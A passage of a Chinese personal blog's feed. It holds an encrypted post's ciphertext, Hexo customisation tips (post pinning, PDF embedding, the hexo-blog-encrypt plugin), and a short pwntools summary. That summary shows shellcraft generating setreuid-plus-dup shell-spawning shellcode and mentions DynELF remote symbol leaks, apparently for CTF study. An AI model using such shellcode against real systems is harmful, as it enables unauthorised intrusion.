af0caf8b1fce02e62cf328f6f3b559ead4686a6b98c087a5c0c4b9813dd4d8ccb7c7e8dbc2e8c148052ad4af5b3c8f31e0fe71aa4e913ed39eddbf16cc7dca884786e06cd2f6c699744f285e645c30f68d698b8ee47666e15c5a5898ebd7a69e09e0d5e4115cf42f47b8e3a9770d6741c6c3f82835913f346fd345ac01194e60b6984d82a672e8754137aa75926978ec5f3b80f3e750b38dc2b0d10a12aa24a46feebf6948fd3ea84c273db166fa54ff06bec36f3fdb497f68d6709dc8f0a1b774c8d3a0c1f88f3c306198a1b1e7f6d9c212c04afd8800b8c43b3e57a3a3982012595cc322e0aa3eaee7403184c488cccc9c3b35bd9e35f537973f8fb587f7f63d62780b89bb831165ac5ee952b1612cfd126511572f7551ae682f7d3f5b057dc713983165cd174c0f8b8a1dab2933acf21088ec690f3857f95d84832dba0039db06eff62fc3eb295b3495baa42afed421fefc89a23e10f1197c768948eae13fa623082527ca241ebe6905fc77a39de117f4e53a5c9399c0d71bf9a66f7b05cdf9265a89c0b7bf563a9089b5b225e4efc5cb34a0f4c19c45dd61fe986090baf6bbdaf2bd561a953eb190a7bd0c457f40735cb0fa9a1af29c7a67b4f88cee34549316f7fb8ad73fb53f63717309372cb3300843473aaf114ef480f26024f1f573c5a20453c5a482466ba0ac71b7af8c04ab8f2212a761cd1a4d66765a0a2fd9004cc59c430035b87e78bfc321d088b1aa9998bc2d493f13fdca8d3a66c44ac6cd6376af4dc33f217db99344623ed1d57cdcefea6ab742efc1ce92262fe8732ee9d38c1fc75f84aa5cc2c52243d1361f3dd75d46103708bd04ddb299ed202d9935fdc9169406b97d281a3c9e0e451e59ae87dfcc4378932a5cc5cf81824c83f6f5bb7b8f666243df16e573509cfe1dc13d15f894f0c5b987e0c9c10d9c5ee548897865af8794b108feefd524270cd93eff801a402a76b48c3345035b90178145b43da331465469a37681c7b335842b64ad249ab5e1367ce9ca66a7de5a79ba82db25fa3a705c3ceaf169619dd143f686756d20d1e99292438c74efeab372bbeb9ee917ce4bc95bcfd8f97c1a4eb37fe1d8533e780216d43b31e87d3eed36ba5c01fa41d5c5deaa7b86f377e471d435976d9c0baf2035489c48ac92910c9764124911159c616efcc0f97da0447a54ea79985667ee9a2c5b5188e359ef2fc7cdf54bf0e6c350e6d21246c93bfb661b1723c14ade22e0874ea2df82f9df49675e8d6904b37dacc67f478f7f9e3f9e91981672904f5f300d1d9fd8c3fbb9598ea08525b52b812d274d2f2a3990d122d4b7e2270ad13211056ba23dd3672d4a8a3d23ceb8cc8355286a4795db3e8cb059c852bd92ed64223b41f46b3c22d7527adca409335e8c11d4b5fd0cce684f3c36575053ff9a16f4e987b40ff5a76cfdce46074285c85b54453fbe2169aab4cd21b2be7ca5b918c201c65a842141b36761daea53dec9f2a1cea560e19a4dbb3ac2e2530eca704c035cba1e838e4cef31d876a5947979fd45953f5b346578611a80c5baeb7f2583fd68418bc1a87e318dfe97a6c6c4c8dd241fa00f42f5c57f98c2d5da7e90f9d152ab4a0861a2ddab108371aaacb51cf2b97e40832b90d0f8770bb9e0ec683e30f8dc618d7e50eba64801af276a385abea4dd903bccef7f3710b73ffb66e5cedd0b5932852189345c5b46cac28c157a23e96eabee5308b2cb007af2e339fde3daf5038157d1dd1ab5db007cd35a5f4eea436ebd293a4d99d61849c20124c08f98d3e4063a3bc7baae3b9812817ee8e90227367b1fc651c5fd02ff430a22f2a2c0d6273035332cddb244cb9399d13c3d53d2f8885121a641c37f3c02ebd7c7315dee17290c1dd1957bdef4099832ad60d9cf9086f56a6168b277d6776d6e4a7c365b3361720673dd318aeea2453e08eb25ab2721142f4f0457c14dac41b6ff7123b4c5678d57f73e5fdae41072e9f4b1c6a38ea06a8e4d7d82e00390c1b8ce6c34dd0667f66f85b183b0804980e79103649c178b3877beea09b4bc65646adea83ea57f6e28614317a242a5ab045217f1505fe1fb7a4d43b0a5245e81ffd500261de2e816042fef91107024297dde523733290cac2cc440b65366cf3b028737c56e75596d381031d90199609e10a5d68fdedb0ee0d359e7f903860faccf9993d595a11fc933a49ef1bce9a977947ea71e1851fd463d233a1b613b60c70447c353be79d2c1daed1de86437ac738bd01a54f9f3dd0a955a93448efaad5592ac227c23762622b7bd22c75290bca3a34418187ff9524f124c6934db164db2304d1d4a21a9dc2b16c0bfea35c1839dde5d08562aad3b07f95192ed0ec4ddf5e41188ea6756cf13e6f2e24367f76799680821183f910a7ff70044d1ed1c08789b2a55f79d844cb95861a1ea42cf2d79063997c29bd4bd5fa20ea5fe25a7b7ba4b8b81e74a505098ae9493ae6df1c23d0bc96f050ce4eb23ee5c95900a49eb00509a14a6a4429eeade783e8be37f5bd39dcd25eb58126faba411a75e5a1733f1d951035ddd364c4ccb74d9a61ed05923dd5c012923338b4a3603cf97fe1ff7cc155122aa24c5024c96dbd8af173d4a89e47ed8135a3a548e894c6b1a28455b22a9346b03e4a89f1dd2690087e07e0ff60dcccfce7664458de865d354b81a45e2e512bd73cb9cf8227fb24e975b4ab4ed576a1aaaab4b04194190958dae8f66aa7d95130b973f0ba168d9efc961af64f9173c16563d379fd174d4ab4447763628bf6162e2eca8a6236e4f9ebf953eccaed2c7f53627f129a2a5b9a3dee7557efbc964bfd0f9808963d52254f17b7956a9b7dc868071ca262af57ceeaa679da53204f43e4e46f80359f338dc9b48114e91c01749850d4e19447462018f1228363c5aea32d1bf648943a75dcd28c342d0df78b3dbb972c767c19d29b846b49c8ce3c904f4a332a54308f366a6db50bb188daf440926d173bcb0de6afeeb760475272065ce6690b72e813d8c309f2d8ea053ed7d2d8b54af7089444edfe3bb21afdca567b36308ba96c29e7f496e4d7edae9c418119084841d323b2a75d30c4647bf7c6c5714fdfe2a5f5503a94fa59ae15302ea7079041020ec306fc35a58c869f4178dfa010537e6416d9517ddf312a1223a2ed0e45b08294996692f793ac7e0780dc09b105083175390445975fdec011d2658836ddc062f93cbe84008ad5f4fce3de506ccb47363c66022bcca63851a9e8ae5f241e7feb34ef09673d6ffd6761f79d7f4cf269d1f20afb14ade37202444a902070aa60d2f3809c9d69cbc8db00e797a8917409ce304a87bd294305bb0bdf9720b4f45538e2cdeb34048b23ba3567052c5276218c272057c8fcf5aea6c643fd3b0db60ad7da956e2de32801593d1765736aa2fb678b7a5a685eb5f40e7ef6407fce6b52f9f365dc94c08070173889742ea4f847cd826527327c0977c4108850379e09d5ce1cf961c8a97604127a69bca4761a24c963a140d6f32c9b7b960b531ded7aa9fb985af6b18f4ffa5cece2cb1e98f5805c06723d593035cbfa59cd7f631dd29a638594cd75c0e5716bd5d65e022ddac0d2ab31ce6590b51b503ae5da8ec4a9a9b2961d14f77c2098252d5e3753790fb0c9e276c7df271decf60db51606905504146a695340e78ea92251fe25873328316b6400dbcf093d602dc1842d332760e92ad2079c2ebb5ca58356d0f8d7616c5f9c70f74918c69c87acde173b87577cac53b9f221e1f47e0998d0f753a2b977619c35404cd8f210a9be8d8b2cf1226c5138d8b8dd408c8cdc91ae3279ef26666a5ec459d540e584a305aa2182e2657ec4eeed64a4e25c76faf3bbb48480571e9ddecf93ff31c4e8c55c156b116c7ee693ab0eceb666beaf6f3712066dbf32d1ea305709e3c53ef90a83205804c869d9b1863d055684faf63a68f91ea3970e8213eb4a0f0223bd568e2d5e3996ba758894e1aa28c62341067879cfd48455e0bc203f541697c548c9e75bf0b24d11d1c945efd54c78891810e52a37b2ff2173d57d1c5afa2e70c673d16959fa266aebae0819577fc1a4729e04d9794db4cd12258a21d51256c7a5bfd124e032db813cd0c8b556142a6020edb8864f7bb7924ede093de8bfddb1fe576f9dfbc22f8f9333096525953ed67b03717b48c82f83bc1efd8f417d5959c9c9e27c3fa164b1a1f09f6ba6ea36fd37efc0b22e6a91e73c52bdd122dcaf19565b82c0271f2e945770cfae4a476827fbb16f7044a8f6e91ddeb9460b67f1ec889dcb9fc5aac6def599a3e2260a6197f40555716bda8ce1f05994c0337483c87374986bbccf14f9d2db5ea0ca53038ba101ebb4007019813cdaed4343ab9faf9b8706a9b7efbeead8abc372dba838f5156861379d87506dcb604a38b45d1ba2071644240bb303639a4da49c711a17ca9330381d1e3357ce03f5c52ecddb2c86d36c6e1362e99fee478aaca4068f5835a1328550b0ec1358b0beb947b19f4cb18be054eb9a1b32bdd0c013b50e76c0c82cc172c0d46cae07d6e1e7be3082de0761574c6a64754acdd65202a3b54dea5f933a7bf416992036a7104d868d452b24331b11037da5aff975fb83fa679d9b3d87ea58787e514f2382150610cd27b22c5c5e7bfa56eb02948564a6141dc2f920570dbb2fd77fff3afc89cc8d03e744a8bfa9da675d14f044ad34198554893275e54f39894b80b57d4d089f6e689bf216b50f7509e69d4fca95519b03693e6a0794653c835e991cfbd1a944f2d8a31fc66862df0ec7c4208db590d3e98a2223eb37a239473ddc85af06a76841c9eb80bc8a1f26c7851e502ee7967b6d51be004de035b09f408e03876431c388685444c40dec238200ad0cfe12438459d0e31d80d021c953415357ba47b224ec2455c67288815ada9cc2aa0f1d73877238221f4b7003497905f8bb2aa3f7bda31d1f43cdd3731ae5075e0bf31f64ff4417633fc477b632e0ab3c2e6f0c07035d38f7009951c17d64c209647792b8ee6f7d7f9b681518d499fa0af4fd98da38caccbc88876eaca8e5c1bfcc1801d5dd271682684e0a3574734b11081efa00e96be75fa132d22d3aa12ae717c822b8703d4b9d988e92ecf5f980d9df26d4a9090019725d7db8a007b0749600556a95e1aeddfa878fa85b74a94f38dff8a95cdf597a65d025a9d8f7dd9bec9c11520b6ab79c186b6877422a4479f63592a32887feff914532298cb75b2320a76de59f4adecfe11efac426d37d6b26fadc8ed047183fb830755026d42fc1f3fdf2afbc254d69b5125787266cc6bd1f86aadb732101c94b3e82ea991eb7788bab126c40d3edce2a5f41b45209c5f7a8a1d6ef8e0267057ae354fb32d34b90b2f20ba481847f12962b046f0e008bae159c96c02ad4770ca6e21e1102868a9b0712a8149614cf6aeb359c6525c7004d5fa85415e6acd9f35a227ee283876409f68eec6c1943ee0010a09711735cb8567237fce72091d6c88f39104a0cf2fc6dc6fbc86b6ae70bd6bd10da3bc0ef0dd8fe409fb9097f76ced57a63ff4f0e59379c2969b2fe763b24b89bafb8b29f186245ab6c1d97739c8c1403e10f078e828d06456ae9b467a83992ba9d105a678d7ecd54c5c48df8595f438ef3af410931df50cfeedc99eff2dc5941794135f247cf767d65c19c89fb8397833ee533ea16e9c95a157bba6c04313d9b8d94bbcd8d0d84a869688784503eb12725a87ad66d9a75669ff252f252ea51bf5d87d2a7bc949bbf1d2b0cd91530dfede531b8986749ab8046e08daef64072e8f4971d6dee9e3ae2d3a4afce2d0b899f6ff45dde315ac6786615c1719f7da9b43f46174955256a79d0d00cff5852e0e4646cfa9dcc14b938116a86c051bfd806e53d656ecbec6d26424b13246f1f0a9b95a0dd7b7cec8af2660228e9db03b8b9ffa6bc62182d91c08c87b0ac9d4779c5f335b956fbe91ee89da2e8156ab35c9a39c6c028b5e4d77c24483a498153056b9f7e6a53ee1ba55f499c9b296f7a8065423a11903b5642ce1e4986456c85be458ece75b654ee6a2b400f3a390236566dc66f8438a373f0f77814ea486d037e5556ef246e361dcf6ab81b577c57b0e9edb745b15bdfac688804cb963b460492d67433f97efa3d54632f11d61d204fa07e935fe60cabbaf6553449c7896dcff07f65342260f1c7dcf2cf03a271cc7c13857796efffc402295e1aa3562c47ff5dbde7354ee810dd54c2ecb50be92074246cd9c9f946030f73305c7eeffd5f934a5dfda3c2985e9bce4753fdd050345f258edc0655ac01bdbb9fde60d6fe731cf254d886dc70532c4fece863ba11d8314a40abb2e7785619d6313006783c3f10ba1dc493a1d73377b19541e3286a9951b8c55fcdcb28f59b87ad9301bd5115f22d8fd9ff6f5351c640c8678641e24babf9ac285ae47d59957adf9c7d875d9653953a711cdf9e1756e0d274ac8ecd630eabed3f88782b338e2f4240d5863160102f4d3047efb8abb85240739517bfc1887ff151e560c40ef29239873ca3a7e7ec685259bfed9d0d8b96992ee69489b20e2a452b59f92b322e91e71a1ac10ceaf81fe13f688b60c0f7d28aef8247b9d79fb78dc51c38eae27029f52bb29f64f7f0c3e97f5c49646d04174a9778fb3cda1bebd8f15bd5121625ac91079c4cb1099ec511870ae7dd20d7885a7adee0616ea38fc14a185dc39e394dec2fed6731120b9ddf2ffac5758221daff606423bdc345f8f5d08df5deb5f62aef15a8fa534dd276123d7b6f737c8e58723864908394710760e91282bc384ee663f1daffd78a3685a2f87fedf8f0c6ca7a27c9ddb7f25426941104a343738bf9d03d7c86a3bdb8e007fcdbe818216e1cae4e42f5bcde81e5640c71fdb8a6b7227f086c2f9849fee8b6ef8968bf66f19b11c65f182704168ee4572e3f47446302624e667a5a505b9ec102fe4675f57abd0b740acb2fa0d77c30c81991041aa4aeab3a15a67279f730410ed884d516bb274d12f1a97964d972138b100e47f74e058a84f82d18e07cacae2c576f715ecdd0f7254a645ad7193e2e4e6d1a5a5b8a98798f531110b8149ed26190e13abbf1da675f84ba45fe85bfc62fbbbb5aa75f9aa04e5ada4449941670da8b48e5563a3c7fc2e1fbd06451527fd3ed5a5cd705cf1a69a6b7c3627e7fdaf80b4890cccc2ece592d54cb4a311fd5deafb2a11f06c047cdf7105cfcb96ca53c32b967e6dece88a48234c2cc0d6bdb30cd24d85c9d4322596195095324ff4531738d9c384632b84600a60aa10e57825954914c5775ecc5c462a58ef703348ff234aeaf80e15a4f894abcd77c0fd52e0b1c162a42b2672cbcf328513a035b2b02e4fa1284fee8696e6c7858d1b85bf212d7b3e3c0c1a8896ba93a6272f2cdde94762651897065cde34507292cdf55fc9bbbfb021724cbc2748a961663dceee1761f07147b606c2776a54838dca6adfbe919d04e6c1bab6fa383832d924f2e3fc20e3cbcbeeb481fe452c5f83b2a48f6a86d1f9c75b493b94c72cacada2e2f85b3cc81af39832f5517f594488c1add91e10d5c0944cdced9643725e70fab7755876a3418e82db0b2217973f380430e8e303ba3a83a714afa8a93878ecb9bfd7e32265decae4bfbe652f20518b5499e16d80a98439c9c36cc09dd8c403c0498dabc7238aa8ef8e1f45eb74f0c6b662502643b1117972d36ab5ca84e6999cacd8cf394f9dadd01c213419b5cdb93c0994340eb554866bddcfb11929636fdb99350364a0a09508e666f0d17145905be59f5491d5d8d335c5c1b0d23d84fd1cb2b07e4e697fb9f620fdefb935a5691545a8ec953c1e4533bea558c2448a9ff248c0bfc13560f6f178b133018afb016c32b656731afd670b4d2ec40717d1aa937ec51804098e7bfa46337e0f6904aca28895bcb040aea5e3a95de8483e39ea018fb3f2653514757dc2afffee53cd41e01a042a380fd94842fea501ec1cd67a1209e3a9bce1735eb8c549d47ac1d863353f79e2f039e9c035eebb24bb8fdf2a494fb5cdc412082b7381fa431540ea22460f0e518f6ccb540c9788da750c99188a85e5912495adfc10957d82f1e5b8166e8195ff33fe82960e2c719f939e8f49fdc3d9eb94e3ddf6bdecc907027eaeb7fe47cda2ea3371aa17f9f388d99062a512ecca355631b799778884e8ccdc53416aef96660c9868439ca721a20cf30f3b1631e57455b9dac01867a44e01447e35b581d557ab3b237aa5d261caf54599bfbb4191ce31248bd9b09c397e129a4ffa67142a7f46659de260e7dc12645d5996ac83863677f728062ee65dc77972fd51d7e30d42f99c2d8bcb2068e7f016fa0a138ba525376bb820e6f69f05f2859a935bd828df7beea298e49ffc94adf53be49af2010ba3fa77b81298a3336cd2ecfb623f34e4319557f1ce0d5e340b111cd6cd2cb9bbf63a32037d6e62317b45569257c01fb241d23ad991c452a0aabdf5644affceb38923dd7fcb9dd3478ee9ca7f68d36386d6e2580204f19eab34d526262b4fa692576b3a583db72f58de17e64943596ecb1902c4553be8a805b2ed0d4654a1a9ee33b39943b44bc768b024fc4b44aaa717c54cf78b7aaa7b0a1f4573cf61b89e67ff52df045efdee8d4d1793f5a6e81f81c1298df28bfcfb6edc55dd9c48290393fee60add6988d71355057dc101918265a238fdd31c3c72</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      Here&#39;s something encrypted, password is required to continue reading.
    
    </summary>
    
      <category term="Crypto" scheme="https://muzibing.github.io/categories/Crypto/"/>
    
    
      <category term="Crypto" scheme="https://muzibing.github.io/tags/Crypto/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客完善（持续更新）</title>
    <link href="https://muzibing.github.io/2020/04/30/2020.04.30%EF%BC%88113%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/30/2020.04.30（113）/</id>
    <published>2020-04-29T16:00:00.000Z</published>
    <updated>2020-05-02T09:55:24.609Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/1.png" alt></p><h3 id="0x00-添加置顶功能"><a href="#0x00-添加置顶功能" class="headerlink" title="0x00 添加置顶功能"></a><font color="navy"><code>0x00 添加置顶功能</code></font></h3><blockquote><p><a href="https://zhwhong.cn/2017/03/23/deal-with-hexo-article-top-problem/" target="_blank" rel="noopener">解决Hexo博客文章置顶问题</a></p></blockquote><ol><li><p>修改Hexo文件夹下的<code>node_modules/hexo-generator-index/lib/generator.js</code>，在生成文章之前进行文章top值排序</p></li><li><p><code>generator.js</code>最终的内容：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">'use strict'</span>;</span><br><span class="line"><span class="keyword">var</span> pagination = <span class="built_in">require</span>(<span class="string">'hexo-pagination'</span>);</span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function"><span class="keyword">function</span>(<span class="params">locals</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> config = <span class="keyword">this</span>.config;</span><br><span class="line">  <span class="keyword">var</span> posts = locals.posts.sort(config.index_generator.order_by);</span><br><span class="line">  posts.data = posts.data.sort(<span class="function"><span class="keyword">function</span>(<span class="params">a, b</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(a.top &amp;&amp; b.top) &#123;</span><br><span class="line">          <span class="keyword">if</span>(a.top == b.top) <span class="keyword">return</span> b.date - a.date;</span><br><span class="line">          <span class="keyword">else</span> <span class="keyword">return</span> b.top - a.top;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(a.top &amp;&amp; !b.top) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span>(!a.top &amp;&amp; b.top) &#123;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">return</span> b.date - a.date;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">var</span> paginationDir = config.pagination_dir || <span class="string">'page'</span>;</span><br><span class="line">  <span class="keyword">return</span> pagination(<span class="string">''</span>, posts, &#123;</span><br><span class="line">    perPage: config.index_generator.per_page,</span><br><span class="line">    layout: [<span class="string">'index'</span>, <span class="string">'archive'</span>],</span><br><span class="line">    format: paginationDir + <span class="string">'/%d/'</span>,</span><br><span class="line">    data: &#123;</span><br><span class="line">      __index: <span class="literal">true</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ol><h3 id="0x01-添加上传PDF文件功能"><a href="#0x01-添加上传PDF文件功能" class="headerlink" title="0x01 添加上传PDF文件功能"></a><font color="navy"><code>0x01 添加上传PDF文件功能</code></font></h3><blockquote><p><a href="http://leungyukshing.cn/archives/HexoUploadFile.html" target="_blank" rel="noopener">Hexo 博客上传文件</a></p></blockquote><ol><li><p>首先修改程序配置文件 <code>_config.yml</code> 中的 <strong>post_asset_folder:</strong>，这个选项设置为 <code>True</code>。</p></li><li><p>在 <code>source</code> 文件夹下创建名为 <code>pdf</code> 文件夹，将我们需要上传的本地文件移动到这个文件夹。（如 <code>test.pdf</code>）</p></li><li><p>最后在文章中，按照下面的格式引入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[点击下载文件](/pdf/test.pdf)</span><br></pre></td></tr></table></figure></li><li><p>最后重新 <code>hexo g -d</code> 更新就可以了。</p></li></ol><h3 id="0x02-添加在线浏览PDF文件功能"><a href="#0x02-添加在线浏览PDF文件功能" class="headerlink" title="0x02 添加在线浏览PDF文件功能"></a><font color="navy"><code>0x02 添加在线浏览PDF文件功能</code></font></h3><blockquote><p><a href="http://miracle778.site/pdf-test/pdf-test.html" target="_blank" rel="noopener">hexo中插入pdf解决方法</a></p></blockquote><ol><li><p>将<code>_config.yml</code>中的<code>post_asset_folder</code>选项置为<code>true</code></p></li><li><p>在 <code>source</code> 文件夹下创建名为 <code>pdf</code> 文件夹，将我们需要在线浏览的文件移动到这个文件夹</p></li><li><p>在<code>test.md</code>文件中添加如下代码：<code>(不一定非用object标签，embed、iframe标签也一样)</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">data</span>=<span class="string">"/pdf/test.pdf"</span> <span class="attr">type</span>=<span class="string">"application/pdf"</span> <span class="attr">width</span>=<span class="string">"100%"</span> <span class="attr">height</span>=<span class="string">"100%"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>data表示你要上传的pdf的路径,使用相对路径，将你要上传的pdf放入第二步生成的test文 件夹<br>type和width就不说了，这里注意height不能设成100%，</p></blockquote></li></ol><h3 id="0x03-添加文章加密功能"><a href="#0x03-添加文章加密功能" class="headerlink" title="0x03 添加文章加密功能"></a><font color="navy"><code>0x03 添加文章加密功能</code></font></h3><blockquote><p><a href="https://github.com/MikeCoder/hexo-blog-encrypt/blob/master/ReadMe.zh.md" target="_blank" rel="noopener">hexo-blog-encrypt</a></p></blockquote><ol><li><p>安装：<code>npm install --save hexo-blog-encrypt</code></p></li><li><p>在 <code>_config.yml</code> 中启用该插件:</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Security</span></span><br><span class="line"><span class="attr">encrypt:</span> <span class="comment"># hexo-blog-encrypt</span></span><br><span class="line"><span class="attr">  abstract:</span> <span class="string">有东西被加密了,</span> <span class="string">请输入密码查看.</span></span><br><span class="line"><span class="attr">  message:</span> <span class="string">您好,</span> <span class="string">这里需要密码.</span></span><br><span class="line"><span class="attr">  tags:</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">&#123;name:</span> <span class="string">tagName,</span> <span class="attr">password:</span> <span class="string">密码A&#125;</span></span><br><span class="line"><span class="bullet">  -</span> <span class="string">&#123;name:</span> <span class="string">tagName,</span> <span class="attr">password:</span> <span class="string">密码B&#125;</span></span><br><span class="line"><span class="attr">  template:</span> <span class="string">&lt;div</span> <span class="string">id="hexo-blog-encrypt"</span> <span class="string">data-wpm="&#123;&#123;hbeWrongPassMessage&#125;&#125;"</span> <span class="string">data-whm="&#123;&#123;hbeWrongHashMessage&#125;&#125;"&gt;&lt;div</span> <span class="string">class="hbe-input-container"&gt;&lt;input</span> <span class="string">type="password"</span> <span class="string">id="hbePass"</span> <span class="string">placeholder="&#123;&#123;hbeMessage&#125;&#125;"</span> <span class="string">/&gt;&lt;label&gt;&#123;&#123;hbeMessage&#125;&#125;&lt;/label&gt;&lt;div</span> <span class="string">class="bottom-line"&gt;&lt;/div&gt;&lt;/div&gt;&lt;script</span> <span class="string">id="hbeData"</span> <span class="string">type="hbeData"</span> <span class="string">data-hmacdigest="&#123;&#123;hbeHmacDigest&#125;&#125;"&gt;&#123;&#123;hbeEncryptedData&#125;&#125;&lt;/script&gt;&lt;/div&gt;</span></span><br><span class="line"><span class="attr">  wrong_pass_message:</span> <span class="string">抱歉,</span> <span class="string">这个密码看着不太对,</span> <span class="string">请再试试.</span></span><br><span class="line"><span class="attr">  wrong_hash_message:</span> <span class="string">抱歉,</span> <span class="string">这个文章不能被校验,</span> <span class="string">不过您还是能看看解密后的内容.</span></span><br></pre></td></tr></table></figure></li><li><p>将 “<code>password</code>“ 字段添加到文章信息头：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">title: Hello World</span><br><span class="line">tags:</span><br><span class="line"><span class="bullet">- </span>作为日记加密</span><br><span class="line">date: 2016-03-30 21:12:21</span><br><span class="line">password: mikemessi</span><br><span class="line">abstract: 有东西被加密了, 请输入密码查看.</span><br><span class="line">message: 您好, 这里需要密码.</span><br><span class="line">wrong<span class="emphasis">_pass_</span>message: 抱歉, 这个密码看着不太对, 请再试试.</span><br><span class="line">wrong<span class="emphasis">_hash_</span>message: 抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.</span><br><span class="line">---</span><br></pre></td></tr></table></figure></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;/images/1.png&quot; alt&gt;&lt;/p&gt;
&lt;h3 id=&quot;0x00-添加置顶功能&quot;&gt;&lt;a href=&quot;#0x00-添加置顶功能&quot; class=&quot;headerlink&quot; title=&quot;0x00 添加置顶功能&quot;&gt;&lt;/a&gt;&lt;font color=&quot;nav
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>pwntools的简单总结（持续更新）</title>
    <link href="https://muzibing.github.io/2020/04/30/2020.04.29%EF%BC%88112%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/04/30/2020.04.29（112）/</id>
    <published>2020-04-29T16:00:00.000Z</published>
    <updated>2020-04-30T03:25:10.656Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、基本模块"><a href="#一、基本模块" class="headerlink" title="一、基本模块"></a><font color="navy">一、基本模块</font></h3><h4 id="1-asm-disasm"><a href="#1-asm-disasm" class="headerlink" title="1.asm/disasm"></a><font color="blue"><code>1.asm/disasm</code></font></h4><p><code>功能</code>：用来进行汇编/反汇编。</p><p><code>例子</code>：</p><p>asm</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>enhex(asm(<span class="string">'mov eax, 0'</span>))</span><br><span class="line"><span class="string">'b800000000'</span></span><br></pre></td></tr></table></figure><p>disasm</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(disasm(unhex(<span class="string">'6a0258cd80ebf9'</span>)))</span><br><span class="line">   <span class="number">0</span>:   <span class="number">6</span>a <span class="number">02</span>                   push   <span class="number">0x2</span></span><br><span class="line">   <span class="number">2</span>:   <span class="number">58</span>                      pop    eax</span><br><span class="line">   <span class="number">3</span>:   cd <span class="number">80</span>                   int    <span class="number">0x80</span></span><br><span class="line">   <span class="number">5</span>:   eb f9                   jmp    <span class="number">0x0</span></span><br></pre></td></tr></table></figure><p>但是，大多数时候不需要编写自己的shellcode！ pwntools带有pwnlib.shellcraft模块，该模块中装有有用的省时的shellcode。 假设我们要先设置setreuid（getuid()，getuid()），然后将文件描述符4复制到stdin，stdout和stderr，然后弹出一个shell！如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>enhex(asm(shellcraft.setreuid() + shellcraft.dupsh(<span class="number">4</span>))) <span class="comment"># doctest: +ELLIPSIS</span></span><br><span class="line"><span class="string">'6a3158cd80...'</span></span><br></pre></td></tr></table></figure><h4 id="2-dynelf"><a href="#2-dynelf" class="headerlink" title="2.dynelf"></a><font color="blue"><code>2.dynelf</code></font></h4><blockquote><p> <a href="https://docs.pwntools.com/en/stable/dynelf.html" target="_blank" rel="noopener">dynelf 官方文档</a></p></blockquote><p><code>功能</code>：动态解析函数，仅提供指向任何已加载模块的指针，以及一个可以在任何地址泄漏数据的函数。用于远程符号泄露，需要提供leak方法</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;一、基本模块&quot;&gt;&lt;a href=&quot;#一、基本模块&quot; class=&quot;headerlink&quot; title=&quot;一、基本模块&quot;&gt;&lt;/a&gt;&lt;font color=&quot;navy&quot;&gt;一、基本模块&lt;/font&gt;&lt;/h3&gt;&lt;h4 id=&quot;1-asm-disasm&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
      <category term="Binary" scheme="https://muzibing.github.io/categories/Binary/"/>
    
    
      <category term="二进制" scheme="https://muzibing.github.io/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    
